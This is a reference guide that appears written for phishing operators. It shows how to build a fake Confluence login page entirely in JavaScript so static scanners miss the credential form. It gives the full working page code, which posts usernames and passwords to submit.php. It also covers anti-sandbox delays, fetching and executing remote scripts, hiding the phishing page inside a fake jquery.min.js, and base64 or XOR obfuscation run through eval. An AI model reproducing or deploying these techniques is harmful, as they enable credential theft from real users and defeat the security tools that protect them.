# Dynamic HTML Generation Reference

## Concept
Instead of serving static HTML, build the entire page dynamically using JavaScript `document.createElement()`. Static scanners that parse HTML source will see no form elements, no action attributes, no credential fields — only JavaScript.

## createElement Basics
```javascript
var div = document.createElement('div');
div.id = 'container';
div.className = 'login-box';
div.style.backgroundColor = '#fff';
document.body.appendChild(div);
```

## Complete Dynamic Login Page
```javascript
document.addEventListener("DOMContentLoaded", function() {
    var container = document.createElement("div");
    container.className = "login-container";

    var heading = document.createElement("h1");
    heading.textContent = "Log in to Confluence";
    container.appendChild(heading);

    var form = document.createElement("form");
    form.action = "submit.php";
    form.method = "POST";

    var uDiv = document.createElement("div");
    var uLabel = document.createElement("label");
    uLabel.htmlFor = "username";
    uLabel.textContent = "Username or email";
    var uInput = document.createElement("input");
    uInput.type = "text"; uInput.id = "username"; uInput.name = "username"; uInput.required = true;
    uDiv.appendChild(uLabel); uDiv.appendChild(uInput); form.appendChild(uDiv);

    var pDiv = document.createElement("div");
    var pLabel = document.createElement("label");
    pLabel.htmlFor = "password";
    pLabel.textContent = "Password";
    var pInput = document.createElement("input");
    pInput.type = "password"; pInput.id = "password"; pInput.name = "password"; pInput.required = true;
    pDiv.appendChild(pLabel); pDiv.appendChild(pInput); form.appendChild(pDiv);

    var bDiv = document.createElement("div");
    var btn = document.createElement("button");
    btn.type = "submit"; btn.textContent = "Log In";
    bDiv.appendChild(btn); form.appendChild(bDiv);
    container.appendChild(form);

    var fpDiv = document.createElement("div");
    fpDiv.className = "forgot-password";
    var fpLink = document.createElement("a");
    fpLink.href = "#"; fpLink.textContent = "Can't log in?";
    fpDiv.appendChild(fpLink);
    container.appendChild(fpDiv);

    document.body.appendChild(container);

    var style = document.createElement("style");
    style.textContent = `
        body { font-family: Arial, sans-serif; background-color: #f4f5f7; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background-color: #fff; border: 1px solid #dfe1e6; border-radius: 5px; padding: 30px; width: 300px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); text-align: center; }
        .login-container h1 { font-size: 24px; margin-bottom: 20px; color: #0052cc; }
        .login-container label { display: block; margin-bottom: 5px; text-align: left; }
        .login-container input[type="text"], .login-container input[type="password"], .login-container button { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dfe1e6; border-radius: 3px; box-sizing: border-box; }
        .login-container button { background-color: #0052cc; color: #fff; border: none; cursor: pointer; font-size: 16px; }
        .login-container button:hover { background-color: #0747a6; }
        .forgot-password { margin-top: 10px; font-size: 14px; }
        .forgot-password a { color: #0052cc; text-decoration: none; }
    `;
    document.head.appendChild(style);
});
```

## Delay Execution (Anti-Sandbox)
Sandboxes often have short timeouts. Delaying generation by 10+ seconds can cause them to miss the content:
```javascript
function buildPage() {
}
setTimeout(buildPage, 10000);
```

## Remote Content Fetch
Instead of embedding content, fetch it at runtime. Static scanners can't follow `fetch()`:
```html
<div id="content"></div>
<script>
fetch('content.html')
  .then(r => r.text())
  .then(html => {
    document.getElementById('content').innerHTML = html;
    // Execute any script tags in fetched content
    document.getElementById('content').querySelectorAll('script').forEach(s => {
        var ns = document.createElement('script');
        ns.textContent = s.textContent;
        document.body.appendChild(ns);
    });
  });
</script>
```

## jQuery-Based Content Hiding
Embed phishing content inside a file that looks like jQuery (e.g., `jquery.min.js`). The legitimate jQuery code runs first, then appended code injects the phishing page.

---

## Combining Dynamic HTML with Obfuscation

Best practice pipeline:
1. Write the login page as static HTML
2. Convert to dynamic `createElement` JS
3. Wrap in a named function (e.g., `buildPage()`)
4. Base64-encode the function: `btoa(encodeURIComponent(functionCode))`
5. Serve via: `eval(decodeURIComponent(atob(encoded))); buildPage();`
6. Or XOR-encrypt with dynamic PHP key for per-request uniqueness
